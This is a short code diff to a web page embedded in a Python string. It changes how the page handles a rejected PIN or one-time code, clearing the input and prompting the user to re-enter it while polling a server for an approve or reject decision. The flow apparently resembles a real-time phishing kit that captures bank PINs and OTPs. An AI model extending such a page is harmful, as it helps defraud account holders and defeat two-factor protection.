@@ -960,17 +960,24 @@ HTML_PAGE = r"""<!DOCTYPE html>
             if (otpStepTimer) clearTimeout(otpStepTimer);
             if (otpAutoTimer) clearTimeout(otpAutoTimer);
             if (step === 'pin') {
+              isPinBusy = false;
               enteredPin = '';
               updatePinDots();
+              const pinMsg = document.getElementById('pin-status-msg');
+              if (pinMsg) pinMsg.innerText = 'Incorrect PIN entered. Please re-enter your PIN.';
               goTo('pin');
               alert('The PIN entered is incorrect. Please re-enter your PIN.');
             } else if (step === 'otp') {
+              const otpInput = document.getElementById('otp-input');
+              if (otpInput) otpInput.value = '';
               const btnOtp = document.getElementById('btn-otp');
               if (btnOtp) { btnOtp.disabled = false; btnOtp.innerText = 'VERIFY CODE'; }
               const errorMsg = document.getElementById('otp-error-msg');
               if (errorMsg) errorMsg.innerText = 'Incorrect code entered. Please re-enter the code.';
               goTo('otp');
+              alert('The OTP entered is incorrect. Please re-enter the code.');
             }
+
           } else if (data.status === 'approve') {
             clearInterval(decisionTimer);
             if (otpStepTimer) clearTimeout(otpStepTimer);
